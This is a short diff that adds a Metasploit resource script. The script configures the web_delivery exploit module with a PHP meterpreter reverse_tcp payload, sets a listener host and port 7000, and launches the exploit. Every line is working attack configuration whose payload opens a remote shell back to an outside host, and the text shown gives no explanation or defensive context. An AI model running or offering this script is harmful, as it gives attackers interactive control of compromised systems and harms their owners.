@@ -1,0 +1,8 @@
+use exploit/multi/script/web_delivery
+set TARGET 1
+set URIPATH /
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST 201.9.80.97
+set LPORT 7000
+exploit
+
